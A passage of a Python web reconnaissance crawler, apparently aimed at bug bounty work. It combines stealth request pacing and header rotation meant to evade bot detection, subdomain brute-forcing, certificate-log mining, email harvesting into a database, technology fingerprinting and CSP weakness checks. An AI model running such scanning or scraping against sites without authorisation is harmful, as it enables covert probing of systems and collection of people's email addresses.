#!/usr/bin/env python3
import argparse
import sqlite3, re, random, sys, socket, ssl, time, json, os
from collections import defaultdict
import asyncio
import aiohttp
from datetime import datetime
from urllib.parse import urljoin, urlparse
from urllib.robotparser import RobotFileParser
import urllib3.exceptions
from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
import warnings
import requests
import dns.resolver
import whois
import threading

warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)

# Playwright is optional — gracefully disabled if not installed
try:
    from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

# playwright-stealth is optional — suppresses bot-detection fingerprints
try:
    from playwright_stealth import Stealth
    PLAYWRIGHT_STEALTH_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_STEALTH_AVAILABLE = False

# pymysql is optional — enables MySQL auth probing
try:
    import pymysql
    PYMYSQL_AVAILABLE = True
except ImportError:
    PYMYSQL_AVAILABLE = False

# ─────────────────────────────────────────────
# Constants
# ─────────────────────────────────────────────

COMMON_PORTS    = [21, 22, 23, 25, 53, 80, 443, 8080, 8443, 3306, 5432, 6379, 27017]

# ─────────────────────────────────────────────
# Stealth profile system
# ─────────────────────────────────────────────

STEALTH_PROFILE = "LOUD"   # overridden by --stealth CLI arg
BUG_BOUNTY_HEADER = None   # Set via --bug-bounty-header CLI arg. None = disabled.
SAME_DOMAIN_ONLY = False   # overridden by --same-domain-only CLI arg
START_URL = ""             # set at crawler startup; used by is_in_scope()

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
]

# GHOST: per-domain request counters and pause thresholds
_domain_request_counts = defaultdict(int)
_ghost_thresholds      = {}   # domain -> current pause threshold (15–25)

def _ghost_pause_threshold(domain):
    if domain not in _ghost_thresholds:
        _ghost_thresholds[domain] = random.randint(15, 25)
    return _ghost_thresholds[domain]

def _reset_ghost_threshold(domain):
    _ghost_thresholds[domain] = random.randint(15, 25)

def stealth_delay(domain=None):
    """Sleep before every outbound HTTP request according to STEALTH_PROFILE."""
    if STEALTH_PROFILE == "LOUD":
        return
    if STEALTH_PROFILE == "NORMAL":
        time.sleep(random.uniform(0.5, 1.5))
    elif STEALTH_PROFILE == "GHOST":
        time.sleep(random.uniform(2.0, 6.0))
        if domain:
            _domain_request_counts[domain] += 1
            if _domain_request_counts[domain] >= _ghost_pause_threshold(domain):
                time.sleep(random.uniform(8.0, 15.0))
                _domain_request_counts[domain] = 0
                _reset_ghost_threshold(domain)

def stealth_headers(existing=None):
    """Return a headers dict with stealth values merged over existing."""
    if STEALTH_PROFILE == "LOUD":
        headers = dict(existing or {})
        if BUG_BOUNTY_HEADER:
            headers["X-Bug-Bounty"] = BUG_BOUNTY_HEADER
        return headers
    headers = dict(existing or {})
    headers["User-Agent"] = random.choice(UA_POOL)
    headers["Accept-Language"] = random.choice([
        "en-US,en;q=0.9",
        "en-GB,en;q=0.8",
        "en-US,en;q=0.8,es;q=0.6",
    ])
    headers["Accept-Encoding"] = random.choice(["gzip, deflate, br", "gzip, deflate"])
    if STEALTH_PROFILE == "GHOST":
        if random.random() > 0.5:
            headers["DNT"] = "1"
        else:
            headers.pop("DNT", None)
        headers["Cache-Control"] = random.choice(["no-cache", "max-age=0"])
        if random.random() > 0.5:
            headers["Upgrade-Insecure-Requests"] = "1"
        else:
            headers.pop("Upgrade-Insecure-Requests", None)
    if BUG_BOUNTY_HEADER:
        headers["X-Bug-Bounty"] = BUG_BOUNTY_HEADER
    return headers
RATE_LIMIT_MIN  = 1.0
RATE_LIMIT_MAX  = 3.0
MAX_CONCURRENT  = 5
SITEMAP_CAP     = 500
REQUEST_TIMEOUT = 8
ASYNC_TIMEOUT   = 10
QUEUE_SAVE_FILE     = "crawl_state.json"
PLAYWRIGHT_FLAGS    = {"enabled": False}  # mutable — no global needed
PLAYWRIGHT_TIMEOUT  = 15000   # ms — page load timeout for Playwright
PLAYWRIGHT_MAX_CONC = 2       # max concurrent browser pages (Pi-friendly)
JS_CONTENT_MIN      = 500     # bytes — if aiohttp gets less, try Playwright
QUEUE_SAVE_INTERVAL = 25

# Subdomains to probe for each discovered root domain
SUBDOMAIN_WORDLIST = [
    "www", "mail", "smtp", "pop", "imap", "ftp", "sftp",
    "admin", "administrator", "portal", "dashboard", "cpanel", "whm",
    "api", "api2", "v1", "v2", "rest", "graphql",
    "dev", "development", "staging", "stage", "uat", "test", "qa", "sandbox",
    "beta", "alpha", "preview", "demo",
    "shop", "store", "checkout", "payments", "billing",
    "vpn", "remote", "citrix", "rdp", "ssh",
    "git", "gitlab", "github", "bitbucket", "svn",
    "jenkins", "ci", "cd", "build", "deploy",
    "jira", "confluence", "wiki", "docs", "helpdesk", "support", "status",
    "cdn", "static", "assets", "media", "img", "images", "upload",
    "blog", "news", "forum", "community",
    "db", "database", "mysql", "postgres", "redis", "mongo",
    "mx", "mx1", "mx2", "email", "webmail", "exchange",
    "ns", "ns1", "ns2", "dns",
    "backup", "old", "archive",
    "mobile", "m", "app",
    "cloud", "s3", "storage",
]

# Security headers that should be present — absence is a finding
SECURITY_HEADERS_REQUIRED = [
    "Strict-Transport-Security",
    "Content-Security-Policy",
    "X-Frame-Options",
    "X-Content-Type-Options",
    "Referrer-Policy",
    "Permissions-Policy",
]

# Headers that reveal info and shouldn't be present
SECURITY_HEADERS_SENSITIVE = [
    "X-Powered-By",
    "Server",
    "X-AspNet-Version",
    "X-AspNetMvc-Version",
]

TECH_SIGNATURES = {
    # ── CMS ───────────────────────────────────────────────────────────────
    "WordPress":      {
        "headers": ["Link: wp-json"],
        "html":    ["wp-content/", "wp-includes/", "wp-login.php", "xmlrpc.php", "wp-json"],
    },
    "Drupal":         {
        "headers": ["X-Generator: Drupal", "X-Drupal-Cache", "X-Drupal-Dynamic-Cache"],
        "html":    ["drupal.settings", "/sites/default/files", "/misc/drupal.js", "drupal.org"],
    },
    "Joomla":         {
        "headers": [],
        "html":    ["/components/com_", "joomla!", "/media/jui/", "joomla.org"],
    },
    "Shopify":        {
        "headers": ["X-ShopId", "X-ShopifyRequestId", "X-Sorting-Hat-ShopId"],
        "html":    ["cdn.shopify.com", "shopify.theme", "myshopify.com", "shopify_pay"],
    },
    "Wix":            {
        "headers": ["X-Wix-Request-Id"],
        "html":    ["static.wixstatic.com", "wixsite.com", "wix.com/_api/"],
    },
    "Squarespace":    {
        "headers": [],
        "html":    ["squarespace.com", "static.squarespace", "squarespace-cdn.com"],
    },
    # ── JS frameworks ─────────────────────────────────────────────────────
    "React":          {
        "headers": [],
        "html":    ["__reactfiber", "__reactprops", "data-reactroot", "data-reactid", "react-dom"],
    },
    "Next.js":        {
        "headers": ["X-Powered-By: Next.js"],
        "html":    ["/_next/static/", "__next_data__", "/_next/chunks/"],
    },
    "Vue.js":         {
        "headers": [],
        "html":    ["__vue__", "__vue_app__", "data-v-app", "vue.min.js", "vue.runtime.min.js"],
    },
    "Nuxt.js":        {
        "headers": [],
        "html":    ["__nuxt", "__nuxt_data__", "/_nuxt/"],
    },
    "Angular":        {
        "headers": [],
        "html":    ["ng-version", "_nghost-", "_ngcontent-", "ng-reflect-", "angular.min.js"],
    },
    "Gatsby":         {
        "headers": [],
        "html":    ["___gatsby", "gatsby-chunk-mapping", "gatsby-focus-wrapper"],
    },
    "jQuery":         {
        "headers": [],
        "html":    ["jquery.min.js", "jquery-", "/jquery/", "jquery.js"],
    },
    "Bootstrap":      {
        "headers": [],
        "html":    ["bootstrap.min.css", "bootstrap.css", "bootstrap.min.js", "bootstrap.bundle"],
    },
    # ── Web servers / CDN ─────────────────────────────────────────────────
    "Cloudflare":     {
        "headers": ["CF-RAY", "cf-cache-status", "Server: cloudflare"],
        "html":    [],
    },
    "Nginx":          {
        "headers": ["Server: nginx"],
        "html":    [],
    },
    "Apache":         {
        "headers": ["Server: Apache", "Server: apache"],
        "html":    [],
    },
    "Microsoft IIS":  {
        "headers": ["Server: Microsoft-IIS"],
        "html":    [],
    },
    "LiteSpeed":      {
        "headers": ["Server: LiteSpeed", "Server: OpenLiteSpeed", "X-LiteSpeed-Cache"],
        "html":    [],
    },
    "Cloudfront":     {
        "headers": ["X-Amz-Cf-Id", "Via: cloudfront"],
        "html":    [],
    },
    # ── Analytics / tag management ────────────────────────────────────────
    "Google Analytics": {
        "headers": [],
        "html":    ["google-analytics.com", "gtag(", "ga('create'", "analytics.js"],
    },
    "Google Tag Mgr": {
        "headers": [],
        "html":    ["googletagmanager.com/gtm.js", "googletagmanager.com/ns.html"],
    },
    # ── Backend languages / frameworks ────────────────────────────────────
    "PHP":            {
        "headers": ["X-Powered-By: PHP"],
        "html":    ["<?php", "php fatal error", "call to undefined function"],
    },
    "ASP.NET":        {
        "headers": ["X-Powered-By: ASP.NET", "X-AspNet-Version", "X-AspNetMvc-Version"],
        "html":    ["__viewstate", "__eventvalidation", "webresource.axd", "scriptresource.axd"],
    },
    "Laravel":        {
        "headers": ["Set-Cookie: laravel_session"],
        "html":    ["laravel_session", 'name="csrf-token"'],
    },
    "Django":         {
        "headers": ["Set-Cookie: csrftoken"],
        "html":    ["csrfmiddlewaretoken", "__admin_media_prefix__", "django"],
    },
    "Ruby on Rails":  {
        "headers": ["X-Runtime", "Set-Cookie: _session_id"],
        "html":    ["rails-ujs", "data-remote=\"true\"", "action-cable-consumer"],
    },
}

# ─────────────────────────────────────────────
# Utility
# ─────────────────────────────────────────────

def timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def print_error(error):
    print(timestamp() + " ERROR: " + str(error))

def sanitize_url(url):
    url = url.replace("https://", "").replace("http://", "").replace("www.", "")
    if url.endswith("/"):
        url = url[:-1]
    return url

def extract_root_domain(domain):
    """
    Strip subdomains using the Public Suffix List.
    Correctly handles multi-part TLDs like .co.uk, .com.au, .org.nz etc.
    Falls back to naive last-two-parts if publicsuffix2 is unavailable.
    """
    try:
        import publicsuffix2
        return publicsuffix2.get_sld(domain) or domain
    except ImportError:
        # Fallback — naive but better than nothing
        # Handles common two-part TLDs manually
        TWO_PART_TLDS = {
            "co.uk", "co.nz", "co.au", "co.za", "co.jp", "co.in",
            "com.au", "com.br", "com.mx", "com.ar", "com.sg", "com.hk",
            "org.uk", "net.uk", "me.uk", "org.au", "net.au",
            "gov.uk", "gov.au", "gov.nz", "edu.au",
        }
        parts = domain.split(".")
        if len(parts) >= 3:
            two_part = ".".join(parts[-2:])
            if two_part in TWO_PART_TLDS:
                return ".".join(parts[-3:])
        if len(parts) >= 2:
            return ".".join(parts[-2:])
        return domain

def rate_limit():
    time.sleep(random.uniform(RATE_LIMIT_MIN, RATE_LIMIT_MAX))

# ─────────────────────────────────────────────
# Resume state
# ─────────────────────────────────────────────

def save_state(start_url, url_queue, url_seen, visited, pages_crawled, same_domain_only):
    state = {
        "start_url":        start_url,
        "same_domain_only": same_domain_only,
        "pages_crawled":    pages_crawled,
        "saved_at":         timestamp(),
        "url_queue":        list(url_queue),
        "url_seen":         list(url_seen),
        "visited":          list(visited),
    }
    try:
        with open(QUEUE_SAVE_FILE, "w") as f:
            json.dump(state, f)
        print(timestamp() + " State saved — " + str(len(url_queue)) + " in queue, " + str(pages_crawled) + " crawled.")
    except Exception as e:
        print_error("Failed to save state: " + str(e))

def load_state():
    try:
        with open(QUEUE_SAVE_FILE, "r") as f:
            state = json.load(f)
        print(timestamp() + " Resuming — " + str(len(state["url_queue"])) + " in queue, " + str(state["pages_crawled"]) + " already crawled.")
        return state
    except FileNotFoundError:
        return None
    except Exception as e:
        print_error("Failed to load state: " + str(e))
        return None

def clear_state():
    try:
        if os.path.exists(QUEUE_SAVE_FILE):
            os.remove(QUEUE_SAVE_FILE)
    except Exception:
        pass

# ─────────────────────────────────────────────
# Request helpers
# Accept-Encoding deliberately excludes br to avoid brotli issues
# ─────────────────────────────────────────────

def create_request_header():
    """Build a base request header dict. Stealth overrides applied via stealth_headers()."""
    base = {
        "Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Encoding":           "gzip, deflate",
        "Accept-Language":           "en-US,en;q=0.9",
        "User-Agent":                random.choice(UA_POOL),
        "Connection":                "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest":            "document",
        "Sec-Fetch-Mode":            "navigate",
        "Sec-Fetch-Site":            "none",
        "Sec-Fetch-User":            "?1",
        "DNT":                       "1",
    }
    return stealth_headers(base)

def safe_get(url, timeout=REQUEST_TIMEOUT, method="get"):
    try:
        domain = urlparse(url).netloc
        stealth_delay(domain)
        fn = requests.get if method == "get" else requests.head
        return fn(url, headers=create_request_header(), timeout=timeout, allow_redirects=True)
    except Exception:
        return None

def grab_title(url):
    resp = safe_get(url)
    if resp and resp.status_code == 200:
        try:
            soup = BeautifulSoup(resp.content, "lxml")
            t = soup.find('title')
            return str(t.string).strip() if t else None
        except Exception:
            pass
    return None

# Valid TLDs for email filtering - blocks obvious garbage
VALID_EMAIL_TLDS = {
    "com","net","org","edu","gov","io","co","uk","ca","au","de","fr",
    "nl","se","no","dk","fi","ie","nz","jp","cn","ru","br","mx","in",
    "info","biz","me","tv","us","email","mail","ninja","dev","app",
}

def is_valid_email(email):
    """Filter out garbage matches from the regex."""
    # Must have exactly one @
    if email.count("@") != 1:
        return False
    local, domain = email.split("@")
    # Local part: 1-64 chars, no leading/trailing dots or hyphens
    if not local or len(local) > 64:
        return False
    if local.startswith(".") or local.startswith("-"):
        return False
    if local.endswith(".") or local.endswith("-"):
        return False
    # Domain must have at least one dot
    if "." not in domain:
        return False
    # TLD must be recognisable
    tld = domain.rsplit(".", 1)[-1].lower()
    if tld not in VALID_EMAIL_TLDS:
        return False
    # No consecutive dots
    if ".." in email:
        return False
    # Local part must be at least 2 chars and mostly printable ascii
    if len(local) < 2:
        return False
    # Reject if local part is all uppercase (usually a CSS/hex fragment)
    if local.isupper() and len(local) < 6:
        return False
    # Must contain at least one letter
    if not re.search(r"[a-zA-Z]", local):
        return False
    return True

# TLDs that are actually image/media file extensions, not real email domains
_FAKE_EMAIL_TLDS = {
    'png', 'jpg', 'jpeg', 'gif', 'webp', 'svg', 'ico', 'bmp',
    'mp4', 'mp3', 'mov', 'avi', 'pdf', 'zip', 'js', 'css', 'json'
}

def _is_real_email(candidate):
    """Return False for regex matches that are image filenames or paths, not real emails."""
    candidate = candidate.strip()
    if candidate.count('@') != 1:
        return False
    local, domain = candidate.split('@', 1)
    if '/' in domain or '\\' in domain:
        return False
    if '.' not in domain:
        return False
    tld = domain.rsplit('.', 1)[-1].lower()
    if tld in _FAKE_EMAIL_TLDS:
        return False
    if '/' in local or '\\' in local:
        return False
    if len(local) < 1:
        return False
    return True

def email_scraper(html_content):
    try:
        # Tighter regex - requires proper structure
        email_pattern = r"[a-zA-Z0-9][a-zA-Z0-9\.\-\_\+]{0,62}@[a-zA-Z0-9][a-zA-Z0-9\-]{0,62}(?:\.[a-zA-Z0-9\-]{1,63})+\.[a-zA-Z]{2,}"
        soup = BeautifulSoup(html_content, "lxml")
        # Get text only - skip script and style tags
        for tag in soup(["script", "style", "noscript"]):
            tag.decompose()
        text = soup.get_text(separator=" ")
        raw = [e for e in re.findall(email_pattern, text) if _is_real_email(e)]
        # Also check href="mailto:..." links which are more reliable
        for a in soup.find_all("a", href=True):
            href = a["href"]
            if href.startswith("mailto:"):
                addr = href[7:].split("?")[0].strip()
                if addr:
                    raw.append(addr)
        # Deduplicate, lowercase, validate
        seen = set()
        for email in raw:
            email = email.lower().strip(".,;:()[] ")
            if email in seen:
                continue
            seen.add(email)
            if is_valid_email(email):
                write_to_email_database(email)
    except Exception as e:
        print_error("email_scraper: " + str(e))

# ─────────────────────────────────────────────
# Security header analysis
# ─────────────────────────────────────────────

def analyze_security_headers(domain, headers):
    """
    Check response headers for security posture.
    Flags missing protective headers and leaky informational headers.
    Saves findings to SecurityHeaders table.
    """
    try:
        missing  = []
        present  = []
        leaking  = []

        for h in SECURITY_HEADERS_REQUIRED:
            if h.lower() in {k.lower() for k in headers}:
                present.append(h)
            else:
                missing.append(h)

        for h in SECURITY_HEADERS_SENSITIVE:
            val = headers.get(h) or headers.get(h.lower())
            if val:
                leaking.append(h + ": " + str(val))
                # Alert on EOL PHP versions — known vulnerable
                if h == "X-Powered-By" and "php" in str(val).lower():
                    try:
                        php_ver = str(val).lower().replace("php/", "").strip()
                        major = php_ver.split(".")[0]
                        if major in EOL_PHP_VERSIONS:
                            alert(
                                f"EOL PHP VERSION EXPOSED: {val}",
                                "CRITICAL",
                                domain,
                                f"X-Powered-By: {val} — PHP {major}.x is end-of-life and unpatched"
                            )
                    except Exception:
                        pass

        if missing:
            print(timestamp() + " Missing security headers on " + domain + ": " + ", ".join(missing))
        if leaking:
            print(timestamp() + " Leaking headers on " + domain + ": " + ", ".join(leaking))
        if present and not missing:
            print(timestamp() + " Security headers OK on " + domain)

        write_to_security_headers_database(domain, present, missing, leaking)

        # Deep CSP analysis if header is present
        csp_value = headers.get("Content-Security-Policy") or \
                    headers.get("content-security-policy")
        if csp_value:
            analyse_csp(domain, csp_value)

    except Exception as e:
        print_error("analyze_security_headers: " + str(e))


def analyse_csp(domain, csp_value):
    """
    Parse a Content-Security-Policy header and flag specific weaknesses
    that make XSS exploitation trivially easy.

    Each weakness is independently reportable. A policy with multiple
    issues is a stronger finding — the detail lists all of them.

    Severity:
      HIGH   — directive makes XSS directly exploitable
               (unsafe-inline in script-src, wildcard script-src, missing default-src)
      MEDIUM — weakens defence-in-depth without direct XSS enablement
               (unsafe-eval, data: URIs, overly broad img-src)
    """
    issues = []
    csp    = csp_value.lower()

    # Parse directives into a dict: directive → value string
    directives = {}
    for part in csp_value.split(";"):
        part = part.strip()
        if not part:
            continue
        tokens = part.split(None, 1)
        directive = tokens[0].lower()
        value     = tokens[1].lower() if len(tokens) > 1 else ""
        directives[directive] = value

    # ── 1. Missing default-src ──────────────────────────────────
    # Without default-src, browsers fall back to allowing everything
    # for directives not explicitly set.
    if "default-src" not in directives and "script-src" not in directives:
        issues.append({
            "severity": "HIGH",
            "issue":    "Missing default-src and script-src",
            "detail":   "No fallback directive — browser allows inline scripts and arbitrary sources"
        })

    # ── 2. unsafe-inline in script-src or default-src ──────────
    # Allows any inline <script> tag to execute — directly enables XSS.
    for directive in ("script-src", "default-src"):
        val = directives.get(directive, "")
        if "'unsafe-inline'" in val or "unsafe-inline" in val:
            issues.append({
                "severity": "HIGH",
                "issue":    f"'unsafe-inline' in {directive}",
                "detail":   "Inline scripts permitted — any XSS payload executes without restriction"
            })
            break  # Only report once

    # ── 3. Wildcard (*) in script-src or default-src ───────────
    # Allows scripts from any origin — CSP provides no protection.
    for directive in ("script-src", "default-src"):
        val = directives.get(directive, "")
        tokens = val.split()
        if "*" in tokens or "'*'" in tokens:
            issues.append({
                "severity": "HIGH",
                "issue":    f"Wildcard '*' in {directive}",
                "detail":   "Scripts from any domain are permitted — policy provides no origin restriction"
            })
            break

    # ── 4. unsafe-eval in script-src or default-src ────────────
    # Allows eval(), setTimeout(string), Function() constructor —
    # common XSS escalation vectors even without inline scripts.
    for directive in ("script-src", "default-src"):
        val = directives.get(directive, "")
        if "'unsafe-eval'" in val or "unsafe-eval" in val:
            issues.append({
                "severity": "MEDIUM",
                "issue":    f"'unsafe-eval' in {directive}",
                "detail":   "eval() and dynamic code execution permitted — enables script injection via eval-based sinks"
            })
            break

    # ── 5. data: URI in script-src ─────────────────────────────
    # Allows scripts as base64-encoded data: URIs — XSS bypass.
    for directive in ("script-src", "default-src"):
        val = directives.get(directive, "")
        if "data:" in val.split():
            issues.append({
                "severity": "HIGH",
                "issue":    f"'data:' URI scheme in {directive}",
                "detail":   "Scripts can be loaded as base64 data: URIs — common CSP bypass technique"
            })
            break

    # ── 6. Overly broad script-src hosts ───────────────────────
    # CDN domains that host user content or JSONP endpoints are
    # well-known CSP bypass vectors.
    BYPASS_HOSTS = [
        "*.googleapis.com", "ajax.googleapis.com",
        "*.cloudflare.com", "cdnjs.cloudflare.com",
        "*.jsdelivr.net", "cdn.jsdelivr.net",
        "*.unpkg.com", "unpkg.com",
        "*.github.io",  # user-controlled content
        "*.s3.amazonaws.com",
        "*.blob.core.windows.net",
    ]
    for directive in ("script-src", "default-src"):
        val = directives.get(directive, "")
        for bypass in BYPASS_HOSTS:
            if bypass.lower() in val or bypass.lower().lstrip("*.") in val:
                issues.append({
                    "severity": "MEDIUM",
                    "issue":    f"Bypassable CDN host in {directive}: {bypass}",
                    "detail":   f"{bypass} hosts user-controllable content or JSONP — allows CSP bypass"
                })

    # ── 7. Missing frame-ancestors ─────────────────────────────
    # Without frame-ancestors, X-Frame-Options is the only clickjacking
    # protection. CSP frame-ancestors supersedes XFO in modern browsers.
    if "frame-ancestors" not in directives:
        issues.append({
            "severity": "MEDIUM",
            "issue":    "Missing frame-ancestors directive",
            "detail":   "No CSP clickjacking protection — relies solely on X-Frame-Options if present"
        })

    # ── 8. report-uri / report-to absence ──────────────────────
    # Not a vulnerability, just informational — skip alerting.

    if not issues:
        print(timestamp() + f" CSP OK on {domain}")
        return

    # Collate all issues into one alert per domain
    high_issues   = [i for i in issues if i["severity"] == "HIGH"]
    medium_issues = [i for i in issues if i["severity"] == "MEDIUM"]
    severity      = "HIGH" if high_issues else "MEDIUM"

    all_details = "; ".join(
        f"[{i['severity']}] {i['issue']}: {i['detail']}"
        for i in issues
    )

    alert(
        "WEAK CONTENT SECURITY POLICY",
        severity,
        domain,
        f"{len(issues)} CSP weakness(es) found — {all_details[:400]}"
    )
    print(timestamp() + f" CSP weaknesses [{severity}] on {domain}: "
          + ", ".join(i["issue"] for i in issues))

# ─────────────────────────────────────────────
# Subdomain enumeration
# ─────────────────────────────────────────────

# Track which root domains we've already enumerated to avoid repeating
_enumerated_roots = set()

def detect_wildcard(root_domain):
    """
    Probe two independently random subdomains that cannot possibly exist.
    If both resolve, wildcard DNS is confirmed. Returns a set of wildcard
    IPs (handles round-robin wildcards that rotate between addresses).
    Returns empty set if no wildcard.
    """
    import uuid
    wildcard_ips = set()
    for _ in range(2):
        random_sub = uuid.uuid4().hex[:12] + "." + root_domain
        try:
            ip = socket.gethostbyname(random_sub)
            wildcard_ips.add(ip)
        except socket.gaierror:
            # At least one random subdomain didn't resolve — no wildcard
            return set()
    if wildcard_ips:
        print(timestamp() + " Wildcard DNS detected for " + root_domain + " -> " + str(wildcard_ips))
    return wildcard_ips

def enumerate_subdomains(domain):
    """
    Try DNS resolution for common subdomains of the root domain.
    Detects wildcard DNS first to avoid false positives.
    Saves confirmed live subdomains to Subdomains table.
    """
    root = extract_root_domain(domain)
    if root in _enumerated_roots:
        return
    _enumerated_roots.add(root)

    # Wildcard check - if random subdomains resolve, the host answers
    # everything. We still enumerate but filter results matching any
    # wildcard IP so genuine subdomains on different IPs survive.
    wildcard_ips = detect_wildcard(root)
    if wildcard_ips:
        print(timestamp() + " Wildcard active on " + root + " -- filtering IPs: " + str(wildcard_ips))

    print(timestamp() + " Subdomain enumeration for " + root + " (" + str(len(SUBDOMAIN_WORDLIST)) + " probes)...")
    found_lock = threading.Lock()
    found = [0]

    def _probe_sub(sub):
        fqdn = sub + "." + root
        try:
            ip = socket.gethostbyname(fqdn)

            # Skip if IP matches any known wildcard IP
            if wildcard_ips and ip in wildcard_ips:
                return

            # Verify it's actually responding over HTTP/HTTPS
            resp = safe_get("https://" + fqdn, timeout=4, method="head")
            if not resp:
                resp = safe_get("http://" + fqdn, timeout=4, method="head")
            status = resp.status_code if resp else None

            # Secondary wildcard guard: CDNs like Cloudflare resolve wildcard
            # DNS to a shared IP AND return HTTP 200 for every hit. Even after
            # IP-level filtering above, double-check: if wildcard_ips is set
            # and this IP is in it, this is a catch-all response — not a real
            # service. Skip alert and takeover check.
            if wildcard_ips and ip in wildcard_ips:
                return

            print(timestamp() + " Subdomain found: " + fqdn + " -> " + ip + (" [" + str(status) + "]" if status else ""))
            write_to_subdomains_database(root, fqdn, ip, status)
            with found_lock:
                found[0] += 1

            # Alert if this subdomain name matches a high-value target
            label = sub.lower()
            if label in HIGH_VALUE_SUBDOMAINS and status and status < 400:
                alert(
                    f"HIGH-VALUE SUBDOMAIN EXPOSED: {label}",
                    "HIGH",
                    fqdn,
                    f"{fqdn} resolves to {ip} and returns HTTP {status}"
                )

            # Subdomain takeover check on every confirmed live subdomain
            check_subdomain_takeover(fqdn)
        except (socket.gaierror, socket.timeout):
            pass   # doesn't resolve - expected for most
        except Exception as e:
            print_error("subdomain probe error for " + fqdn + ": " + str(e))

    from concurrent.futures import ThreadPoolExecutor, as_completed as _as_completed
    with ThreadPoolExecutor(max_workers=20) as _ex:
        _futs = [_ex.submit(_probe_sub, sub) for sub in SUBDOMAIN_WORDLIST]
        for _f in _as_completed(_futs):
            pass

    print(timestamp() + " Subdomain enumeration complete for " + root + " -- " + str(found[0]) + " found.")

# ─────────────────────────────────────────────
# Certificate Transparency log mining
# ─────────────────────────────────────────────

_ct_queried = set()

def query_ct_logs(domain):
    """
    Query Certificate Transparency logs via crt.sh for subdomain discovery.
    Finds subdomains that wordlist enumeration misses — historical certs,
    wildcard certs, and subdomains with unusual names are all captured.
    Deduplicates against existing wordlist results via _enumerated_roots.
    """
    root = extract_root_domain(domain)
    if root in _ct_queried:
        return
    _ct_queried.add(root)

    print(timestamp() + " CT log query for " + root + " (crt.sh)...")
    try:
        stealth_delay("crt.sh")
        resp = requests.get(
            "https://crt.sh/",
            params={"q": f"%.{root}", "output": "json"},
            headers=stealth_headers({"Accept": "application/json"}),
            timeout=20,
        )
        if resp.status_code != 200:
            print_error(f"crt.sh returned {resp.status_code} for {root}")
            return
        entries = resp.json()
    except Exception as e:
        print_error(f"CT log query failed for {root}: {e}")
        return

    # Extract unique FQDNs from the name_value field (may contain SANs, one per line)
    found = set()
    for entry in entries:
        for name in entry.get("name_value", "").splitlines():
            name = name.strip().lstrip("*.")
            if name and name != root and name.endswith("." + root):
                found.add(name)

    if not found:
        print(timestamp() + " CT logs: no additional subdomains found for " + root)
        return

    print(timestamp() + f" CT logs: {len(found)} unique subdomains from crt.sh for {root} — verifying...")

    wildcard_ips = detect_wildcard(root)
    confirmed = 0

    for fqdn in sorted(found):
        try:
            ip = socket.gethostbyname(fqdn)

            if wildcard_ips and ip in wildcard_ips:
                continue

            resp_h = safe_get("https://" + fqdn, timeout=4, method="head")
            if not resp_h:
                resp_h = safe_get("http://" + fqdn, timeout=4, method="head")
            status = resp_h.status_code if resp_h else None

            # Second wildcard guard after HTTP probe
            if wildcard_ips and ip in wildcard_ips:
                continue

            print(timestamp() + " CT subdomain live: " + fqdn + " -> " + ip
                  + (" [" + str(status) + "]" if status else ""))
            write_to_subdomains_database(root, fqdn, ip, status)
            confirmed += 1

            label = fqdn.split(".")[0].lower()
